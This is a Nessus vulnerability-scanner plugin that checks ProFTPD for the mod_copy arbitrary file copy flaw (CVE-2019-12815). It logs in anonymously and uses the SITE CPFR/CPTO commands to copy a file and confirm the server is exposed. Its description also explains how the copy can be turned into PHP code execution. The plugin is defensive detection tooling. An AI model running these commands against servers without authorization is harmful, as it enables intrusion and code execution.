#TRUSTED 2606a82fe45cef6e98cdef5158a02d801029d40370c6e17674ee1a30b219c8128c24fb449cf90f150142b4dd1a42ce0680c4da282a0c1b4e524658a83e6d9997d9638c6b77fee9e471f7a1ca14c11eff88503c466da2c9b0906f53ae16f264894942490d367ccb8b3927e59e734b679999185e7056edd2a4b9bc4205488c6fbd88cf31169ebb36086151a856cdbe08f6c576e249115489434ca132fc3485fccc9c029f0de97ced3996515eb31b5460d4370fe33f517595fcdef1f2560003cb9e958a38aa370cade45ae692786e6070e6755b742b9ef2ab2263bfc51cc36aafeddc42bcd757331c613ed9773ec273af5440824aa6815bc0c32eefacd9c2e03cd11da1da6c4a1e8d78ead8d3d3bd9d906928decd2680c0a36eb1120f18b9d620351d97409aaa7f487891476ac5518884765f5798613867d37d720c66b35f54f737a7483bf9a997fbfc94afeeb704ac63e005068a462ca9a462ab3ea14011729f8de1567b804cc0eb83e26975e3f352f9139161092708c4ce240dc722f619219e87c5dd82ffdf626129ffdf65eb617680298f53825fb7ec267d8105fe127c8705b2d09afe05c7e3f04becd4fd9ebd02d86481499de4e2a8a695dd8bfc8988a7be9ee882d0618c1ab3d3b33d63161ca2ad1a591c6b4c1e3b19a831a82f359317c8f767c44eed0df71dd957762c79126b319d19243b662fbcf474b70c790f55634d0c
#
# (C) Tenable Network Security, Inc.
#

include('compat.inc');

if (description)
{
  script_id(132749);
  script_version("1.4");
  script_cvs_date("Date: 2020/01/10");

  script_cve_id("CVE-2019-12815");
  script_bugtraq_id(109339);

  script_name(english:"ProFTPD 'mod_copy' Arbitrary File Copy Vulnerability (Remote)");

  script_set_attribute(attribute:"synopsis", value:
"It is possible for anonymous users to copy arbitrary files.");
  script_set_attribute(attribute:"description", value:
"The remote host is running ProFTPD. It is affected by a vulnerability in the mod_copy module which fails to honor
  <Limit READ> and <Limit WRITE> configurations as expected. An unauthenticated, remote attacker can exploit this, by
  using the mod_copy module's functionality, in order to copy arbitrary files in the FTP directory, provided that
  anonymous logins and mod_copy are enabled and the FTP directory is accessible from a web server. If a file exists in
  the FTP directory that contains PHP code but does not use the PHP extension, an attacker can copy this file to one with
  a PHP extension in order to execute code.");
  # https://www.bleepingcomputer.com/news/security/proftpd-vulnerability-lets-users-copy-files-without-permission/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a323713d");
  script_set_attribute(attribute:"see_also", value:"http://bugs.proftpd.org/show_bug.cgi?id=4372");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of ProFTPD.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12815");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/07/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2020/01/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:proftpd:proftpd");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2020 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/proftpd");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('ftp_func.inc');
include('spad_log_func.inc');

##
# Authenticate to the FTP server and return a command and data socket.
# @param cmd_port The FTP command port
# @return a list whose first element is the command socket, and second element is the pasv data socket.
##
function establish_ftp_connection(cmd_port)
{
  local_var d_soc, c_soc, d_port;
  c_soc = open_sock_tcp(cmd_port);
  if(!c_soc)
    audit(AUDIT_SOCK_FAIL, cmd_port);

  if (!ftp_authenticate(socket:c_soc, user:'ftp', pass:'Nessus@tenable.com'))
      if (!ftp_authenticate(socket:c_soc, user:'anonymous', pass:'Nessus@tenable.com'))
        {
          close(c_soc);
          audit(AUDIT_HOST_NOT, 'vulnerable as anonymous login is not enabled');
        }
  d_port = ftp_pasv(socket: c_soc);
  spad_log(message:'PASV FTP Port: ' + d_port);
  # Can't get PASV port from FTP server
  if (d_port == 0)
  {
    close(c_soc);
    audit(AUDIT_SVC_ERR, cmd_port);
  }
  d_soc = open_sock_tcp(d_port, transport: get_port_transport(cmd_port));
  if (!d_soc)
  {
    close(c_soc);
    audit(AUDIT_SOCK_FAIL, d_port);
  }
  return make_list(c_soc, d_soc);
}

##
# Lists the contents of the FTP root, printing them to spad_log as well as returning them
# @return the FTP root listing
##
function get_listing()
{
  local_var list_req = 'LIST \r\n';

  spad_log(message:'Sending \'' + list_req + '\'');
  send(socket:cmd_soc, data:list_req);
  cmd_res = ftp_recv_line(socket:cmd_soc);
  spad_log(message:'LIST response code: ' + cmd_res);

  data_res = ftp_recv_listing(socket:data_soc);
  spad_log(message:'Received the following listing of the FTP root:\n' + data_res);

  return data_res;
}

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if (safe_checks())
  # No corresponding audit message
  exit(0, "This plugin requires safe checks to be disabled.");

cmd_port = get_ftp_port(default: 21);

### Unless it's paranoid, make sure the banner exists and looks like ProFTPD. ###
if (report_paranoia < 2)
{
  banner = get_ftp_banner(port:cmd_port);
  if (!banner)
    audit(AUDIT_NO_BANNER, cmd_port);
  if (
    " ProFTPD" >!< banner &&
    "(ProFTPD)" >!< banner &&
    "220 FTP Server ready" >!< banner
  )
    audit(AUDIT_NOT_LISTEN, 'ProFTPD', cmd_port);
}

### Get command and data sockets
socs = establish_ftp_connection(cmd_port:cmd_port);
cmd_soc = socs[0];
data_soc = socs[1];

### Try to STOR from stdin ###
stor_req = 'STOR -\r\n';
spad_log(message:'Sending \'' + stor_req + '\'');
send(socket:cmd_soc, data:stor_req);
cmd_res = ftp_recv_line(socket:cmd_soc);
spad_log(message:'STOR response code: ' + cmd_res);
if (cmd_res !~ '^550')
{
  close(cmd_soc);
  close(data_soc);
  audit(AUDIT_HOST_NOT, 'affected as anonymous users have write permissions');
}

### List files to find a file to copy ###
data_res = get_listing();

# Split the FTP LIST command output and copy the first file or directory
got_file = FALSE;
foreach line (split(data_res, sep:'\r\n', keep:FALSE))
{
  # In both Windows and Linux, the file/dir name should be the last thing in the line
  file_name_res = pregmatch(pattern:".*\s([^\s]+)\s*$", string:line);
  if (!empty_or_null(file_name_res))
  {
    to_copy = file_name_res[1];
    spad_log(message:'File or folder name to copy: ' + to_copy);
    got_file = TRUE;
    break;
  }
}

# Nothing to copy
if (!got_file)
{
  close(cmd_soc);
  close(data_soc);
  audit(AUDIT_HOST_NOT, 'vulnerable as there are no files or directories to copy');
}

### Specify copy from file/dir ###
cpfr_cmd = 'site cpfr ' + to_copy + '\r\n';
spad_log(message:'Sending mod_copy command: \'' + cpfr_cmd + '\'');
send(socket:cmd_soc, data:cpfr_cmd);
# Need this line for copy to work. The response code is empty.
ftp_recv_line(socket:cmd_soc);

### Try to copy it to a different name ###
pattern = rand_str(length:8, charset:'0123456789ABCDEF');
copy_to = 'Nessus-proftpd_file_copy_rce-'+ get_host_ip() + '-' + pattern;
cpto_cmd = 'site cpto ' + copy_to + '\r\n';
spad_log(message:'Sending mod_copy command: \'' + cpto_cmd + '\'');
send(socket:cmd_soc, data:cpto_cmd);


### Check if copied file is present
# Need to close sockets and open a new connection
close(cmd_soc);
close(data_soc);
socs = establish_ftp_connection(cmd_port:cmd_port);
cmd_soc = socs[0];
data_soc = socs[1];

data_res = get_listing();
if (copy_to >!< data_res)
{
  close(cmd_soc);
  close(data_soc);
  audit(AUDIT_HOST_NOT, 'vulnerable as mod_copy did not successfully copy a file');
}

close(cmd_soc);
close(data_soc);
report = 'Nessus was able to copy the file or directory ' + to_copy + ' to the new file ' + copy_to + ' using mod_copy';
security_report_v4(severity:SECURITY_HOLE, port:cmd_port, extra:report);
